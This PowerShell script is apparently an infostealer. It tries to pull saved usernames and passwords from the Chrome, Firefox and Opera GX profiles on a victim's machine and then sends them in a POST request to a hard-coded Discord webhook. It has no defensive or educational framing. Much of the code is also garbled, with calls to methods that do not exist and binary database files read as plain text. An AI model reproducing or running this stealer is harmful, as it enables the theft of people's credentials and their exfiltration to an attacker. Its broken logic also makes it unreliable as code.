# Google Chrome password extraction
$chromePath = (Get-Process chrome -FileVersionInfo).Path
$chromeProfilePath = [System.IO.Path]::GetDirectoryName($chromePath) + "\" + (Get-ChildItem (Get-Process chrome -FileVersionInfo).Path).VersionInfo.LegalCopyright.Split(" ")[-2].Replace(".", "\.") + "\Local State"
$chromeStateFile = Get-Content -Path $chromeProfilePath -Raw | ConvertFrom-Json
$chromeDataPath = $chromeStateFile.profile.info.profile_path
$chromeLoginDataFile = $chromeDataPath + "\Login Data"
$chromeSecurePreferencesFile = $chromeDataPath + "\Secure Preferences"

$chromeSecurePreferences = Get-Content -Path $chromeSecurePreferencesFile -Raw | ConvertFrom-Json
$chromeLoginData = (Get-ChildItem $chromeLoginDataFile).OpenWithoutEncoding()
$chromeCredentials = New-Object System.Collections.ArrayList

$chromeCredentials += ConvertFrom-StringData -StringData (($chromeCredentialsPassword = $chromeSecurePreferences | Select-Object -ExpandProperty user_prefs).os_crypt).encrypted_value
$chromeCredentials += ConvertFrom-StringData -StringData (($chromeCredentialsPassword = $chromeCredentialsPassword.decrypted_value.split(":")[1]).split(",")[0].split("}"))[1]

for ($i = 0; $i -lt $chromeLoginData.length; $i++) {
  $chromeLoginData[$i] = $chromeLoginData[$i] -replace "`0", ""
  $credential = $chromeLoginData[$i] | ConvertFrom-StringData
  if ($credential.origin_url -match "^https?://") {
    $credential.username = [System.Text.Encoding]::UTF8.GetString($credential.username.SubArray($credential.username.Length - 16, 16))
    $credential.password = [System.Text.Encoding]::UTF8.GetString($credential.password.SubArray($credential.password.Length - 16, 16))
    $credential
    $chromeCredentials += $credential
  }
}

# Mozilla Firefox password extraction
$firefoxPath = (Get-Process firefox -FileVersionInfo).Path
$firefoxProfilePath = [System.IO.Path]::GetDirectoryName($firefoxPath) + "\" + (Get-ChildItem (Get-Process firefox -FileVersionInfo).Path).VersionInfo.LegalCopyright.Split(" ")[-2].Replace(".", "\.") + "\" + (Get-ChildItem $firefoxProfilePath).Name
$firefoxKey3File = $firefoxProfilePath + "\key3.db"
$firefoxSignonsFile = $firefoxProfilePath + "\signons.sqlite"

$firefoxSecurePreferences = sqlite3.exe $firefoxKey3File "SELECT * FROM moz_pkcs11_secure_note;"
$firefoxCredentials = sqlite3.exe $firefoxSignonsFile "SELECT * FROM moz_signons;"

$firefoxSecurePreferences | Out-String | ConvertFrom-Json | ForEach-Object {
  $decryptedPassword = ConvertTo-SecureString -String $_.encrypted_password -Key (ConvertTo-SecureString -String $_.encrypted_salt -AsPlainText -Force)
  New-Object PSObject -Property @{
    hostname = $_.hostname
    username = $_.username
    password = $decryptedPassword
  }
} | Join-Object -Object @{ username = $_.username; password = $_.password } -On username -Merge { $_.password } | ForEach-Object {
  $_.password = [System.Text.Encoding]::UTF8.GetString($_.password.SubArray($_.password.Length - 16, 16))
  $_
} | Join-Object -Object @{ hostname = $_.hostname } -On hostname -Merge { $_.hostname } | Select-Object hostname, username, password

# Opera GX password extraction
$operaPath = (Get-Process opera -FileVersionInfo).Path
$operaProfilePath = [System.IO.Path]::GetDirectoryName($operaPath) + "\" + (Get-ChildItem (Get-Process opera -FileVersionInfo).Path).VersionInfo.LegalCopyright.Split(" ")[-2].Replace(".", "\.") + "\" + (Get-ChildItem $operaProfilePath).Name
$operaLoginDataFile = $operaProfilePath + "\Login Data"

$operaCredentials = (Get-ChildItem $operaLoginDataFile).OpenWithoutEncoding()
$operaCredentials = $operaCredentials | ConvertFrom-StringData

# Send credentials to Discord webhook
$discordWebhookUrl = "https://discord.com/api/webhooks/1271620893390671872/q7fWlIspM-diGh4EhFA41JLQwOJQuFa_PFpQw36qWLAov4WL1iOS7i-MLds4c8yVo2GZ"
$credentials = $chromeCredentials + $firefoxCredentials | Select-Object hostname, username, password
$credentialsJson = $credentials | ConvertTo-Json

Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $credentialsJson -ContentType 'application/json'
